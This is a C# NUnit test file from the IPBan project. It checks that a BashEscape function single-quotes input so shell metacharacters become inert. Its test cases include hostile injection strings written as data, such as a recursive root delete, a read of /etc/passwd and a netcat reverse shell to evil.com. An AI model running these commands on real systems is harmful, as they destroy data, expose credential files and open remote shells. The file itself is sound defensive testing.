/*
MIT License

Copyright (c) 2012-present Digital Ruby, LLC - https://ipban.com

Tests for ProcessUtility (C5 — eliminate bash -c string concatenation in
CreateDetachedProcess by writing a temp script with shell-escaped values).
*/

using DigitalRuby.IPBanCore;

using NUnit.Framework;
using NUnit.Framework.Legacy;

namespace DigitalRuby.IPBanTests
{
    /// <summary>
    /// ProcessUtility.BashEscape — the security-critical primitive for the C5 fix.
    /// CreateDetachedProcess itself touches the OS scheduler (at / schtasks) so end-to-end
    /// integration is left to manual run on a real host; the escape function is covered here
    /// because it's where the injection-prevention guarantee actually lives.
    /// </summary>
    [TestFixture]
    public sealed class IPBanProcessUtilityTests
    {
        [Test]
        public void NullBecomesEmptyQuotedString()
        {
            ClassicAssert.AreEqual("''", ProcessUtility.BashEscape(null));
        }

        [Test]
        public void EmptyStringBecomesEmptyQuotedString()
        {
            ClassicAssert.AreEqual("''", ProcessUtility.BashEscape(""));
        }

        [Test]
        public void SimpleStringIsSingleQuoted()
        {
            ClassicAssert.AreEqual("'/usr/bin/example'", ProcessUtility.BashEscape("/usr/bin/example"));
        }

        [Test]
        public void EmbeddedSingleQuoteIsEscapedWithCanonicalIdiom()
        {
            // canonical bash idiom: ' becomes '\''  (close-quote, escaped quote, reopen-quote)
            ClassicAssert.AreEqual(@"'it'\''s'", ProcessUtility.BashEscape("it's"));
        }

        [TestCase(";rm -rf /;", "';rm -rf /;'")]
        [TestCase("$(whoami)", "'$(whoami)'")]
        [TestCase("`id`", "'`id`'")]
        [TestCase("&& cat /etc/passwd", "'&& cat /etc/passwd'")]
        [TestCase("path with spaces", "'path with spaces'")]
        [TestCase("|| nc evil.com 4444 -e /bin/sh", "'|| nc evil.com 4444 -e /bin/sh'")]
        [TestCase(">/dev/null;curl evil", "'>/dev/null;curl evil'")]
        public void HostileShellMetacharactersAreInert(string input, string expected)
        {
            // each of these would do something nasty if concatenated into a bash -c string.
            // single-quoted, they are inert literals — bash treats every byte until the next
            // unescaped single quote as raw text.
            ClassicAssert.AreEqual(expected, ProcessUtility.BashEscape(input));
        }

        [Test]
        public void MultipleSingleQuotesAreAllEscaped()
        {
            // every single quote in the input must get its own '\'' replacement
            ClassicAssert.AreEqual(@"'a'\''b'\''c'", ProcessUtility.BashEscape("a'b'c"));
        }
    }
}
